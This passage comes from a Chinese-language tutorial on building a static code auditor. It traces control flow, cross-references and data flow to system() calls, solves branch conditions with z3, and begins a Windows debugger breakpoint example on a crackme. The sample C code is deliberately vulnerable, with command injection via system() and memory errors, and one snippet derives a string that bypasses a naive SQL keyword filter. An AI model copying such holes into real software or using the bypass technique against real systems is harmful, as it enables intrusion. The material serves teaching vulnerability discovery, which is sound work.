<p>控制流分析面向的是对程序判断的分析,程序通过if switch for while 这些语句对代码块进行跳转执行处理,我们把一段代码改为代码块来理解,把判断语句作为分割代码块之间的跳转条件,这样我们就能得到程序的执行图.对于<code>buffer_resolve()</code> 它的程序执行图如下:</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic13.png" alt="" /></p>
<p>可以看到,<code>buffer_resolve()</code> 中有4 个判断语句,整个程序一共有5 条路径,分别如下:</p>
<pre><code class="language-txt">
entry -&gt; block_1
entry -&gt; block_2 -&gt; block_3 -&gt; block_6
entry -&gt; block_2 -&gt; block_4 -&gt; block_6
entry -&gt; block_2 -&gt; block_5 -&gt; block_6
entry -&gt; block_2 -&gt; block_6

</code></pre>
<p><code>buffer_resolve()</code> 调用<code>execute_command()</code> 函数的代码在block5 代码块里面,要想让代码执行到block5 的路径,那就只有路径<code>entry -&gt; block_2 -&gt; block_5 -&gt; block_6</code> .要满足这条路径,那就必须要满足三个条件:</p>
<pre><code class="language-txt">
condition_1 = (2 &lt;= buffer_length)
condition_2 = (MessageType_Hello == buffer[1])
condition_3 = (MessageType_Execute == buffer[1])

!condition_1 &amp;&amp; !condition_2 &amp;&amp; conditon_3

</code></pre>
<p><code>!condition_1 &amp;&amp; !condition_2 &amp;&amp; conditon_3</code> 指的是条件约束,需我们给定的输入满足这些条件才可以让程序执行到block5 .现在我们继续用AST 从代码中分析控制流.</p>
<pre><code class="language-python">
def get_condition(ast_node) :
    for index in ast_node.subnode :
        if 'condition' == index[0] :
            return index[1].value

    return False

def trance_control_flow_by_ast(start_node,target_node,trance_record) :
    code_record = []

    for node_object_index in start_node.subnode :
        if node_object_index == target_node :
            all_trance_record = trance_record + code_record
            control_flow_list = []

            for trance_record_index in all_trance_record :
                if trance_record_index[1].type == 'if' :
                    control_flow_list.append(get_condition(trance_record_index[1]))

            return (True,control_flow_list)

        code_record.append(node_object_index)

        is_search,sub_data = trance_control_flow_by_ast(node_object_index[1],target_node,trance_record + code_record)

        if is_search :
            control_flow_record_list = sub_data

            return (True,control_flow_record_list)

    return (False,code_record)


search_strategy = '''
execute_command(*)
'''
search_record = search_call_by_strategy(search_strategy,data)

print 'Search Record :',search_record

for search_record_index in search_record.keys() :
    functinon_name = search_record_index
    bingo_record_list = search_record[search_record_index]

    for bingo_record_index in bingo_record_list :
        print trance_control_flow_by_ast(data,bingo_record_index[0],[])

</code></pre>
<p>运行结果如下:</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic14.png" alt="" /></p>
<h3 id="函数交叉引用-1"><a class="header" href="#函数交叉引用-1">函数交叉引用</a></h3>
<p>函数交叉引用旨在于函数之间的调用关系,我们可以用IDA 对上面的代码进行交叉引用图表生成,找到<code>buffer_resolver()</code> 函数,右键&quot;xrefs graph to&quot;.</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic15.png" alt="" /></p>
<p>但是IDA 却弹出了没有找到</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic16.png" alt="" /></p>
<p>&quot;xrefs graph to&quot; 选项的意思是,搜索哪里调用到这个函数(对应从下往上);&quot;xrefs graph from&quot;是搜索当前函数调用了哪些函数(对应从上往下),于是我们选择&quot;xrefs graph from&quot; 再次查看结果</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic17.png" alt="" /></p>
<p>然后我们继续来实现函数交叉引用的功能.代码如下(由于这个代码库只支持对一个函数代码进行序列化AST ,所以用了一个dict 对象保存所有序列化后的代码,故以下的示例代码比较亢长):</p>
<pre><code class="language-python">

code_emun = '''
enum {
  MessageType_Hello = 0,
  MessageType_Execute,
  MessageType_Data
};
'''

code_execute_command = '''
void execute_command(const unsigned char* command) {
    system(command);
}
'''

code_decrypt_data = '''
void decrypt_data(const unsigned char* data_buffer,unsigned char data_buffer_length) {
    unsigned char* buffer[8] = {0};

    for (unsigned int data_index = 0;data_index &lt; data_buffer_length;++data_index)
        buffer[data_index] = data_buffer[data_index] ^ 0x65;

    printf(&quot;Recv:%s\n&quot;,&amp;buffer);
}
'''

code_buffer_resolver = '''
int buffer_resolver(const unsigned char* buffer) {
    unsigned char buffer_length = buffer[0];

    if (2 &lt;= buffer_length)
        return 0;

    if (MessageType_Hello == buffer[1]) {
        printf(&quot;Hello\n&quot;);
    } else if (MessageType_Execute == buffer[1]) {
        unsigned char* command_buffer = (unsigned char*)malloc(buffer_length - 1);

        memset(&amp;command_buffer,0,buffer_length);
        memcpy(&amp;command_buffer,&amp;buffer[2],buffer_length - 2);

        execute_command(command_buffer);
    } else if (MessageType_Data == buffer[1]) {
        decrypt_data(&amp;buffer[2],buffer_length - 2);
    }

    return 1;
}
'''

code_stream = {
    'global_enum' : cparser.get_func_tree(code_emun) ,
    'decrypt_data' : cparser.get_func_tree(code_decrypt_data) ,
    'execute_command' : cparser.get_func_tree(code_execute_command) ,
    'buffer_resolver' : cparser.get_func_tree(code_buffer_resolver) ,
}


def get_function_parameters(ast_node) :
    parameters_list = []

    for subnode_index in ast_node.subnode :
        if subnode_index[1].type == 'parallel' :
            parameters_list += get_function_parameters(subnode_index[1])
        elif subnode_index[0] == 'parameters' :
            parameters_list.append({
                'type' : subnode_index[1].type ,
                'value' : subnode_index[1].value ,
            })
        elif subnode_index[0].startswith('exp') :
            parameters_list.append({
                'type' : subnode_index[1].type ,
                'value' : subnode_index[1].value ,
            })

    return parameters_list

def recursive_find_call(ast_node,find_function_name) :
    find_result = []

    for subnode_index in ast_node.subnode :
        if subnode_index[1] == None :  #  Fix cparser Bug , Maybe Some Node is None ..
            continue

        if 'function_call' == subnode_index[1].type :
            if find_function_name == '*' or find_function_name == subnode_index[1].value :
                parameters_list = get_function_parameters(subnode_index[1])

                find_result.append((subnode_index,parameters_list))

        find_result += recursive_find_call(subnode_index[1],find_function_name)

    return find_result

def xref_function(code_stream,search_function_name) :
    search_xref_data = {}

    for function_name in code_stream.keys() :
        function_code = code_stream[function_name]
        search_result = recursive_find_call(function_code,search_function_name)

        if not search_result :
            continue

        xref_record = xref_function(code_stream,function_name)  #  Recursive find function's Xref ..
        search_xref_data[function_name] = {
            'xref' : xref_record ,
            'reference' : search_result ,
        }

    return search_xref_data


print xref_function(code_stream,'execute_command')


</code></pre>
<p>输出结果如下,因为<code>execute_command()</code> 只被<code>buffer_resolver()</code> 这个函数引用,所以只输出这一个结果.</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic18.png" alt="" /></p>
<p>为了结果更明显,我们搜索<code>system()</code> 函数.</p>
<pre><code class="language-python">
print xref_function(code_stream,'system')

</code></pre>
<p>运行结果如下:</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic19.png" alt="" /></p>
<h3 id="综合分析-1"><a class="header" href="#综合分析-1">综合分析</a></h3>
<p>综合分析阶段我们主要运用以上的四个步骤对源码进行扫描:匹配漏洞-&gt;函数内部数据流跟踪-&gt;控制流跟踪-&gt;交叉引用.有了上面已经写好的功能代码,接下来就是按照逻辑来拼装代码了,Talk is Cheap ,Show you the code :</p>
<p>首先是要修复cparse 库不能对函数参数进行解析的问题,因为我们除了要在函数内部代码定位数据流,最后也需要定位到函数参数中去,故在此先添加第一部分代码</p>
<pre><code class="language-python">
def resolver_function_parameter(code_string) :
    code_string = code_string.strip()
    code_block_declare_offset = code_string.find('{')

    if -1 == code_block_declare_offset :
        return False

    try :
        function_declare_string = code_string[ : code_block_declare_offset ].strip()
        function_return_type = function_declare_string.split(' ')[0]
        function_name = function_declare_string.split('(')[0]
        function_name = function_name.split(' ')[1]
        function_parameters_string = function_declare_string.split('(')[1].strip()
        function_parameters_string = function_parameters_string.split(')')[0].strip()
        resolve_function_parameters_list = function_parameters_string.split(',')
        function_parameters_list = []

        for resolve_function_parameters_index in resolve_function_parameters_list :
            function_parameters_list.append({
                'type' : resolve_function_parameters_index[ : resolve_function_parameters_index.rfind(' ') ] ,
                'name' : resolve_function_parameters_index.split(' ')[-1] ,
            })

        return {
            'type' : function_return_type ,
            'name' : function_name ,
            'parameters' : function_parameters_list ,
        }
    except :
        pass

    return False


code_stream = {
    'global_enum' : {
        'code' : cparser.get_func_tree(code_emun) ,
        'declare' : resolver_function_parameter(code_emun) ,
    } ,
    'decrypt_data' : {
        'code' : cparser.get_func_tree(code_decrypt_data) ,
        'declare' : resolver_function_parameter(code_decrypt_data) ,
    } ,
    'execute_command' : {
        'code' : cparser.get_func_tree(code_execute_command) ,
        'declare' : resolver_function_parameter(code_execute_command) ,
    } ,
    'buffer_resolver' : {
        'code' : cparser.get_func_tree(code_buffer_resolver) ,
        'declare' : resolver_function_parameter(code_buffer_resolver) ,
    } ,
}

# ...

def xref_function(code_stream,search_function_name) :
    search_xref_data = {}

    for function_name in code_stream.keys() :
        function_code = code_stream[function_name]['code']  #  Get Code from code_stream .
        search_result = recursive_find_call(function_code,search_function_name)

        if not search_result :
            continue

        xref_record = xref_function(code_stream,function_name)
        search_xref_data[function_name] = {
            'xref' : xref_record ,
            'reference' : search_result ,
        }

    return search_xref_data


</code></pre>
<p>然后为了让<code>search_call_by_strategy()</code> 减少输出无用的结果,在此加入了对搜索结果的内容是否为空进行筛选:</p>
<pre><code class="language-python">
def search_call_by_strategy(search_strategy,code_object) :
    search_strategy = resolve_strategy(search_strategy)
    search_record = {}

    for search_strategy_index in search_strategy :  #  Search Call by Strategy
        find_function_name = search_strategy_index[0]
        search_check_parameter_list = search_strategy_index[1]
        find_function_call = recursive_find_call(code_object,find_function_name)
        search_record_list = []

        print_search_result(find_function_call)

        for call_index in find_function_call :  #  Find Match Strategy Call
            ast_node_info = call_index[0]
            parameters_list = call_index[1]

            if search_check_parameter_list :
                check_parameter_list = []

                for search_check_parameter_index in search_check_parameter_list :  #  Filter Call Argument
                    if len(parameters_list) &lt;= search_check_parameter_index :
                        continue

                    target_search_parameter = parameters_list[search_check_parameter_index]

                    if not target_search_parameter['type'] in ['variable','address_of'] :  #  Check this Argument is a Variant ..
                        continue

                    check_parameter_list.append(target_search_parameter)

                if check_parameter_list :
                    search_record_list.append((ast_node_info,check_parameter_list))
            else :
                search_record_list.append((ast_node_info,[]))

        if search_record_list :  #  Fix This : If not found function call result so we let it empty (我总感觉这个语法不对。。。)
            search_record[find_function_name] = search_record_list

    return search_record

</code></pre>
<p>接下来我们继续修复数据流分析的代码,支持跟踪到函数参数</p>
<pre><code class="language-python">
def xref_variant(trance_record,bingo_parameter_name,function_declare) :
    xref_record = []

    for trance_record_index in trance_record[ :: -1 ] :
        if trance_record_index[1].type in ['get_element','assign'] :
            if bingo_parameter_name in trance_record_index[1].value :
                xref_record.append({
                    'type' : trance_record_index[1].type ,
                    'value' : trance_record_index[1].value ,
                    'node' : trance_record_index
                })
        elif trance_record_index[1].type == 'function_call' :
            function_parameters = get_function_parameters(trance_record_index[1])

            for function_parameter_index in function_parameters :
                if not bingo_parameter_name in function_parameter_index['value'] :
                    continue

                xref_record.append({
                    'type' : trance_record_index[1].type ,
                    'value' : trance_record_index[1].value ,
                    'node' : trance_record_index
                })

    for function_parameter_index in function_declare['parameters'] :  #  Add this
        function_parameter_name = function_parameter_index['name']

        if not bingo_parameter_name == function_parameter_name :
            continue

        xref_record.append({
            'type' : 'parameter' ,
            'value' : function_parameter_name ,
            'node' : None
        })

    return xref_record

def trance_record_by_ast(start_node,target_node,bingo_parameters,function_declare,trance_record) :  #  Add new Parameter : function_declare
    code_record = []

    for node_object_index in start_node.subnode :
        if node_object_index == target_node :
            xref_record_list = []

            for bingo_parameter_index in bingo_parameters :
                xref_record_list.append(xref_variant(trance_record + code_record,bingo_parameter_index['value'],function_declare))

            return (True,xref_record_list)

        code_record.append(node_object_index)

        is_search,sub_data = trance_record_by_ast(node_object_index[1],target_node,bingo_parameters,function_declare,trance_record + code_record)

        if is_search :
            xref_record_list = sub_data

            return (True,xref_record_list)

        sub_code_record = sub_data
        code_record += sub_code_record

    return (False,code_record)

</code></pre>
<p>组合这些代码,我们可以进行基本的漏洞匹配和回溯功能了.</p>
<pre><code class="language-python">
search_strategy = 'system(*)'
search_record_list = []

for function_name in code_stream.keys() :
    search_record = search_call_by_strategy(search_strategy,code_stream[function_name]['code'])

    #print 'Search Record :',search_record

    if not search_record :
        continue

    search_record_list.append({
        'function_name' : function_name ,
        'record' : search_record ,
    })

for search_record_index in search_record_list :
    xref_reference_function_name = search_record_index['function_name']
    reference_record_list = search_record_index['record']

    for reference_function_name in reference_record_list.keys() :
        reference_point_list = reference_record_list[reference_function_name]

        for reference_point in reference_point_list :
            code_object = code_stream[xref_reference_function_name]['code']
            code_function_declare = code_stream[xref_reference_function_name]['declare']
            reference_point_ast_node = reference_point[0]
            reference_variant_list = reference_point[1]
            control_flow_list = trance_control_flow_by_ast(code_object,reference_point_ast_node,[])
            data_flow_list = trance_record_by_ast(code_object,reference_point_ast_node,reference_variant_list,code_function_declare,[])
            xref_function_list = xref_function(code_stream,xref_reference_function_name)

            print 'reference_point',reference_point
            print 'control_flow_list',control_flow_list
            print 'data_flow_list',data_flow_list
            print 'xref_function_list',xref_function_list

</code></pre>
<p>运行结果如下:</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic20.png" alt="" /></p>
<p>接下来我们继续拓展深度递归功能,把上面的分析代码再修改</p>
<pre><code class="language-python">
def deep_trance(reference_point_list,xref_reference_function_name,current_function_name) :
    trance_record = {}
    #print 'deep_trance  :  ',current_function_name,'-&gt;',xref_reference_function_name

    for reference_point in reference_point_list :
        code_object = code_stream[xref_reference_function_name]['code']
        code_function_declare = code_stream[xref_reference_function_name]['declare']
        reference_point_ast_node = reference_point[0]
        reference_variant_list = reference_point[1]
        control_flow_list = trance_control_flow_by_ast(code_object,reference_point_ast_node,[])[1]
        data_flow_list = trance_record_by_ast(code_object,reference_point_ast_node,reference_variant_list,code_function_declare,[])[1]
        xref_function_list = xref_function(code_stream,xref_reference_function_name)
        xref_record_list = []

        for xref_function_name in xref_function_list.keys() :
            xref_function_object = xref_function_list[xref_function_name]

            xref_record_list.append(deep_trance(xref_function_object['reference'],xref_function_name,xref_reference_function_name))

        trance_record[xref_reference_function_name] = {
            'data_flow' : data_flow_list ,
            'control_flow' : control_flow_list ,
            'xref' : xref_record_list ,
        }

    return trance_record


search_strategy = 'system(*)'
search_record_list = []

for function_name in code_stream.keys() :
    search_record = search_call_by_strategy(search_strategy,code_stream[function_name]['code'])

    if not search_record :
        continue

    search_record_list.append({
        'function_name' : function_name ,
        'record' : search_record ,
    })

for search_record_index in search_record_list :
    xref_reference_function_name = search_record_index['function_name']
    reference_record_list = search_record_index['record']

    for reference_function_name in reference_record_list.keys() :
        reference_point_list = reference_record_list[reference_function_name]

        print 'Xref-Search for',reference_function_name,'deep_trance() Result :'
        print deep_trance(reference_point_list,xref_reference_function_name,reference_function_name)

</code></pre>
<p>搜索输出结果如下:</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic21.png" alt="" /></p>
<h3 id="判断求解-1"><a class="header" href="#判断求解-1">判断求解</a></h3>
<p>静态代码分析的最后一部分就是尝试对控制流进行求解了,前面我们已经可以从<code>system(*)</code> 策略中指定一个敏感参数然后向上溯源(在此为了方便演示,没有对数据输入来源进行可控判断[比如判断是不是可以接受$_GET[],$_POST[],$_COOKIE[] 中接收到的数据],读者们有意可以自行完善),其实这对于自动化白盒审计来说还是不足的,接下来我们尝试对判断进行求解,让程序可以计算满足输入条件的内容.</p>
<p>我们先来一些简单的条件约束来探索,这是一段简单的对两个输入变量的判断</p>
<pre><code class="language-c">
int main(int argc,int argv) {
    a = atoi(argv[1]);  //  atoi() 的意思是转换字符串到数字
    b = atoi(argv[2]);

    if (a &lt; 10) {
      if (b &gt;= 5) {
        printf(&quot;niubi&quot;);
      } else {
        printf(&quot;666&quot;);
      }
    } else {
      if (b &lt; 4) {
        printf(&quot;777&quot;);
      } else if (b == 5) {
        printf(&quot;?&quot;);
      } else {
        printf(&quot;so diao&quot;);
      }
    }

    return 1;
}

</code></pre>
<p>对应的程序流程图如下:</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic22.png" alt="" /></p>
<p>如果想要程序满足条件输出&quot;niubi&quot; ,那么a 的值需要小于10 且b 的值大于等于5 .那么我们用z3 来尝试对此进行条件求解,代码如下:</p>
<pre><code class="language-python">
from z3 import *


a = Int('a')
b = Int('b')
solver = Solver()

solver.add(a &lt; 10)
solver.add(b &gt;= 5)
solver.check()

result = solver.model()

print result

</code></pre>
<p>输出结果如下:</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic23.png" alt="" /></p>
<p>了解原理后,我们用这段示例代码来进行审计,然后对判断进行求解.先对原有的函数代码继续完善.</p>
<pre><code class="language-python">
def search_call_by_strategy(search_strategy,code_object) :
    search_strategy = resolve_strategy(search_strategy)
    search_record = {}

    for search_strategy_index in search_strategy :  #  Search Call by Strategy
        find_function_name = search_strategy_index[0]
        search_check_parameter_list = search_strategy_index[1]
        find_function_call = recursive_find_call(code_object,find_function_name)
        search_record_list = []

        print_search_result(find_function_call)

        for call_index in find_function_call :  #  Find Match Strategy Call
            ast_node_info = call_index[0]
            parameters_list = call_index[1]

            if search_check_parameter_list :
                check_parameter_list = []

                for search_check_parameter_index in search_check_parameter_list :  #  Filter Call Argument
                    if len(parameters_list) &lt;= search_check_parameter_index :
                        continue

                    target_search_parameter = parameters_list[search_check_parameter_index]

                    if not target_search_parameter['type'] in ['variable','address_of','string'] :  #  Fix there , add check string
                        continue

                    check_parameter_list.append(target_search_parameter)

                if check_parameter_list :
                    search_record_list.append((ast_node_info,check_parameter_list))
            else :
                search_record_list.append((ast_node_info,[]))

        if search_record_list :
            search_record[find_function_name] = search_record_list

    return search_record


def trance_control_flow_by_ast(start_node,target_node,trance_record) :
    other_if_condition = []

    for node_object_index in start_node.subnode :
        if node_object_index == target_node :
            if_block_list = {}
            if_block_depth = 0
            control_flow_list = []

            for trance_record_index in trance_record :
                #print trance_record_index[0],trance_record_index[1].type,trance_record_index[1].value

                if trance_record_index[0] in ['if','ifbody','condition'] :
                    condition_data = get_condition(trance_record_index[1])

                    if not condition_data :
                        continue

                    if_block_depth += 1
                    if_block_list[if_block_depth] = [ condition_data ]
                elif trance_record_index[0] == 'elsebody' :
                    condition_data = get_condition(trance_record_index[1])

                    if not condition_data :
                        if_condition_list = if_block_list[if_block_depth]

                        for if_condition_index in range(len(if_condition_list)) :
                            if_condition_list[if_condition_index] = '!(%s)' % if_condition_list[if_condition_index]

                        if_block_list[if_block_depth] = if_condition_list
                        if_block_depth -= 1

                        if not if_block_depth :
                            for if_block_index in if_block_list.values() :
                                control_flow_list += if_block_index

                            if_block_list = {}
                    else :
                        if_block_list[if_block_depth][-1] = '!(%s)' % if_block_list[if_block_depth][-1]
                        if_block_list[if_block_depth].append(condition_data)

            if if_block_list :
                for if_block_index in if_block_list.values() :
                    control_flow_list += if_block_index

            return (True,control_flow_list)

        is_search = False

        if node_object_index[0] == 'if' :
            other_if_condition = [ node_object_index ]
            is_search,sub_data = trance_control_flow_by_ast(node_object_index[1],target_node,trance_record + other_if_condition)
        elif node_object_index[0] in ['ifbody','elsebody'] :
            other_if_condition.append(node_object_index)
            is_search,sub_data = trance_control_flow_by_ast(node_object_index[1],target_node,trance_record + other_if_condition)

        if is_search :
            control_flow_record_list = sub_data

            return (True,control_flow_record_list)

    return (False,None)

</code></pre>
<p>接口功能代码写好之后,接下来就是实现逻辑代码:</p>
<pre><code class="language-python">
from z3 import *


def adjust_calculate(calculate_string) :
    if calculate_string.startswith('!(') :
        calculate_string = calculate_string[ calculate_string.find('!(') + 2 : calculate_string.rfind(')') ]
        calculate_string = calculate_string.replace('==','!=')
        #calculate_string = calculate_string.replace('!=','==')  #  ...
        calculate_string = calculate_string.replace('&lt;','&gt;=')
        calculate_string = calculate_string.replace('&gt;','&lt;=')
        calculate_string = calculate_string.replace('&gt;=','&lt;')
        calculate_string = calculate_string.replace('&lt;=','&gt;')

    return calculate_string


test_code = '''
int main(int argc,int argv) {
    a = atoi(argv[1]);
    b = atoi(argv[2]);

    if (a &lt; 10) {
      if (b &gt;= 5) {
        printf(&quot;niubi&quot;);
      } else {
        printf(&quot;666&quot;);
      }
    } else {
      if (b &lt; 4) {
        printf(&quot;777&quot;);
      } else if (b == 5) {
        printf(&quot;?&quot;);
      } else {
        printf(&quot;so diao&quot;);
      }
    }

    return 1;
}
'''

#  Tips : cParser have a bug ,you need to setting for every code block .if don't do that ,some if / else condition will resolve except ..

code_object = cparser.get_func_tree(test_code)
search_record = search_call_by_strategy('printf(*)',code_object)

for search_function_name in search_record.keys() :
    search_record_object = search_record[search_function_name]

    for reference_point in search_record_object :
        control_flow_list = trance_control_flow_by_ast(code_object,reference_point[0],[])[1]

        a = Int('a')
        b = Int('b')
        solver = Solver()

        print control_flow_list

        for control_flow_index in control_flow_list :
            exec('solver.add(' + adjust_calculate(control_flow_index) + ')')  #  Z3 solver.add() just only support condition that is not string .

        solver.check()

        print 'Result :',solver.model()


</code></pre>
<p>运行效果如下:</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic24.png" alt="" /></p>
<p>对于整数的求解还是相对较为简单的,因为对整数的求解是<strong>连续</strong>的,这个很容易计算,但是对于内存区域来说变化就非常多了,而且各个内存的字节是<strong>不连续</strong>的,这就导致使求解的难度增高了不少.我们用图例来讲解:</p>
<p>对于一个字符串进行内容过滤/检测限制,实质是在字符串上搜索有没有存在特定的内容,比如我们要进行SQL 注入防护,可以对单引号和and 进行字符串过滤</p>
<pre><code class="language-php">
$user_id = str_replace(&quot;'&quot;,&quot;&quot;,$_GET['id']);
$user_id = str_replace(&quot;and&quot;,&quot;&quot;,$user_id);

</code></pre>
<p><code>str_replace()</code> 会对在字符串上一步一步地搜索匹配指定的内容.</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic25.png" alt="" /></p>
<p>翻译到条件求解,也就是说各个字节都存在一个合并的判断,如果第一个字节为a ,那么再判断后一字节是否为n ,然后再判断最后一字节是不是d .那么可以把他们合并条件约束:<code>str[0] != 'a' &amp;&amp; str[1] != 'n' &amp;&amp; str[2] != 'd'</code>;对于后一字节,同样进行条件约束:<code>str[1] != 'a' &amp;&amp; str[2] != 'n' &amp;&amp; str[3] != 'd'</code>,一直到n-2 字节.</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic26.png" alt="" /></p>
<p>我们可以尝试在判断求解的时候对数据内容进行一个假定,假设某处内容为a ,b ,c 并赋予到指定的buffer 空间中尝试进行求解,这个过程就是Fuzzing ,只不过通常我们是用程序执行来跑判断,而现在使用求解器来跑判断.</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic27.png" alt="" /></p>
<p>先来构造一个简单的buffer ,然后对buffer 的内容做一些基本的条件限制.</p>
<pre><code class="language-python">
byte1 = BitVec('byte1',8)
byte2 = BitVec('byte2',8)
byte3 = BitVec('byte3',8)
solver = Solver()

solver.add(Or(And(65 &lt;= byte1,byte1 &lt;= 65+25),And(105 &lt;= byte1,byte1 &lt;= 105+25)))
solver.add(Or(And(65 &lt;= byte2,byte2 &lt;= 65+25),And(105 &lt;= byte2,byte2 &lt;= 105+25)))
solver.add(Or(And(65 &lt;= byte3,byte3 &lt;= 65+25),And(105 &lt;= byte3,byte3 &lt;= 105+25)))
solver.add(byte1 != ord('A'),byte2 != ord('N'),byte3 != ord('D'))

solver.check()

result = solver.model()

for index in result :
    print chr(result[index].as_long()) ,

</code></pre>
<p>运行结果如下:</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic28.png" alt="" /></p>
<p>因为在SQL 注入中是需要依赖特点的字符串组合来触发漏洞的,所以我们在此需要构建一段可以触发问题的测试Payload</p>
<pre><code class="language-python">
byte1 = BitVec('byte1',8)
byte2 = BitVec('byte2',8)
byte3 = BitVec('byte3',8)
solver = Solver()

solver.add(Or(And(65 &lt;= byte1,byte1 &lt;= 65+25),And(105 &lt;= byte1,byte1 &lt;= 105+25)))
solver.add(Or(And(65 &lt;= byte2,byte2 &lt;= 65+25),And(105 &lt;= byte2,byte2 &lt;= 105+25)))
solver.add(Or(And(65 &lt;= byte3,byte3 &lt;= 65+25),And(105 &lt;= byte3,byte3 &lt;= 105+25)))
solver.add(byte1 != ord('A'),byte2 != ord('N'),byte3 != ord('D'))
solver.add(byte1 == ord('O'),byte2 != ord('r'))

solver.check()

result = solver.model()

print chr(result[byte1].as_long()) ,
print chr(result[byte2].as_long()) ,
print chr(result[byte3].as_long()) ,

</code></pre>
<p>运行结果如下:</p>
<p><img src="6.static-analysis/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8E%9F%E7%90%86/pic6/pic29.png" alt="" /></p>
<p>对字符串的求解的基本原理就是这样了,读者们有兴趣可以尝试利用上面的代码对<code>system()</code> 进行求解.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="15-libfuzzer-asan"><a class="header" href="#15-libfuzzer-asan">15. Libfuzzer Asan</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="151-动态程序分析原理"><a class="header" href="#151-动态程序分析原理">15.1. 动态程序分析原理</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="152-libfuzzer-asan"><a class="header" href="#152-libfuzzer-asan">15.2. Libfuzzer Asan</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h2 id="内存监控-1"><a class="header" href="#内存监控-1">内存监控</a></h2>
<p>在动态调试代码的过程中,我们往往会需要对某一块特定的内存,字符串或对代码执行过程进行跟踪分析.内存监控分为软件监控和硬件监控,下面将一一描述.</p>
<h3 id="软件监控-1"><a class="header" href="#软件监控-1">软件监控</a></h3>
<p>软件监控的方式分为两种,一种是在代码段中插入<code>Int 3</code>指令,代码执行到这段指令后就会触发调试中断;另一种是对内存区域进行读写权限限制,对于某个在堆(HeapAlloc())的权限是不可读写的,但是通过malloc() 申请的内存是可以被读写的,那么一旦这块内存产生越界读写就可以触发程序异常.</p>
<p>我们以UPX 加壳举个例子,Link : https://github.com/lcatro/my-blog/blob/master/2015/%E5%88%A9%E7%94%A8Debug%20API%20%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E6%B3%A8%E5%86%8C%E6%9C%BA.md .假定已经通过逆向知道0x4307CC 是UPX 解压缩之后的程序入口点,那么我们在编写调试器的时候可以在0x4307CC 处设置调试断点.</p>
<pre><code class="language-c">
#include &lt;malloc.h&gt;
#include &lt;memory.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;winnt.h&gt;

#define BREAK_ADDRESS_SHELL_JMP 0x4307CC
#define BREAK_ADDRESS_JE        0x401188
#define BREAK_FLAG 0xCC

const char* set_break(HANDLE process,LPVOID set_address,unsigned int set_length=1) {  //  设置断点
    if (!set_length) return NULL;

    char* break_flag_buffer=(char*)malloc(set_length);
    memset(break_flag_buffer,BREAK_FLAG,set_length);
    DWORD write_length=0;

    char* old_code_buffer=(char*)malloc(set_length);
    DWORD read_length=0;
    ReadProcessMemory(process,set_address,(LPVOID)old_code_buffer,set_length,&amp;read_length);  //  原理是通过写0xCC 来实现软中断

    WriteProcessMemory(process,set_address,(LPVOID)break_flag_buffer,set_length,&amp;write_length);
    free(break_flag_buffer);

    return old_code_buffer;
}

bool remove_break(HANDLE process,LPVOID remove_address,const char* rewrite_code_buffer,unsigned int remove_length) {  //  删除断点
    DWORD write_length=0;

    return (bool)WriteProcessMemory(process,remove_address,(LPVOID)rewrite_code_buffer,remove_length,&amp;write_length);
}

HANDLE open_process(DWORD processid) {
    return OpenProcess(PROCESS_ALL_ACCESS,FALSE,processid);
}

int main(int argc,char** argv) {
    STARTUPINFO process_startupinfo={0};
    PROCESS_INFORMATION process_info={0};
    CreateProcess(NULL,&quot;crackme_shell.exe&quot;,NULL,NULL,FALSE,DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE,NULL,NULL,&amp;process_startupinfo,&amp;process_info);  //  启动调试程序
